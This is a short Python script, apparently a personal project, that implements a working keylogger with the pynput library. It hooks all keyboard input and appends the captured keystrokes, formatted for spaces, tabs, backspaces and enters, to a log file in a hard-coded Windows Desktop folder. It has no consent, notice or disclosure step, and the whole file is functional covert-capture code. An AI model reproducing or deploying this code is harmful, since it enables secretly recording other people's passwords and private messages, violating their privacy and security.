from pynput.keyboard import Key, Listener
import os


count = 0
keys = []

def on_press(e):
    global keys, count
    keys.append(e)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    os.chdir("C:\\Users\\claud\\Desktop\\eventi")
    with open("log1234.txt", "a+") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                    f.write('  ')
            elif k.find("Key") == -1:
                    f.write(k)

            elif k.find("tab") > 0:
                f.write('  ')

            elif k.find("backspace") > 0:
                f.write('[backspace]')

            elif k.find("enter") > 0: 
                    f.write('\n')

with Listener(on_press = on_press) as listener:
    listener.join()
   